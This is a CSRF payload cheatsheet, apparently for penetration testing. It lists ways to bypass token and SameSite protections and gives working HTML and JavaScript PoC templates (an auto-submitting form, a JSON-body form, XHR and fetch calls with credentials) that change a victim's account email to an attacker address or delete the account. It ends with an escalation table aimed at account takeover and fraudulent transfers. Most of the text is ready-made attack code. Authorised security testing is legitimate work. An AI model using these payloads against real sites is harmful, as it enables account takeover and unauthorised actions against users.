# CSRF — Payload Cheatsheet

## Detection Methodology

### Check for CSRF Protections
```
1. Is there a CSRF token in forms? (hidden input, meta tag)
2. Is the token validated server-side? (remove it, change it)
3. Is SameSite cookie attribute set? (Strict, Lax, None)
4. Is Origin/Referer header checked?
5. Does the action require re-authentication?
```

### Token Bypass Tests
```
# Remove token entirely
# Change token to empty string
# Use another user's token
# Change HTTP method (POST→GET may skip check)
# Remove content-type header
# Change content-type to text/plain (avoids preflight)
```

## PoC Templates

### Basic Form
```html
<html>
<body>
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click me">
</form>
</body>
</html>
```

### Auto-Submit
```html
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
</body>
</html>
```

### JSON Body CSRF
```html
<html>
<body>
<form action="https://target.com/api/change-email" method="POST"
      enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}' type="hidden">
  <input type="submit">
</form>
</body>
</html>
```

### With XMLHttpRequest (if CORS misconfigured)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/change-email", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;
xhr.send('{"email":"attacker@evil.com"}');
</script>
```

### Using Fetch API
```html
<script>
fetch('https://target.com/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil.com'
});
</script>
```

## SameSite Bypass Patterns

### SameSite=Lax (default in modern browsers)
```
# Lax allows GET requests from top-level navigations
# If state-changing action accepts GET:
<a href="https://target.com/api/change-email?email=evil@evil.com">Click</a>

# Or via window.open:
<script>window.open('https://target.com/api/delete-account')</script>
```

### SameSite=None
```
# No protection — standard CSRF works
# But requires Secure flag (HTTPS only)
```

## Validation Criteria

1. State-changing action performed without user intent
2. The CSRF token (if present) is actually validated
3. The action has real security impact (not just UI changes)
4. PoC works in a realistic delivery scenario

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| Account takeover | CSRF to change email → password reset → full access |
| Privilege escalation | CSRF to add admin role to attacker account |
| Data modification | CSRF to delete/modify victim's data |
| Financial | CSRF to initiate transfer/purchase |
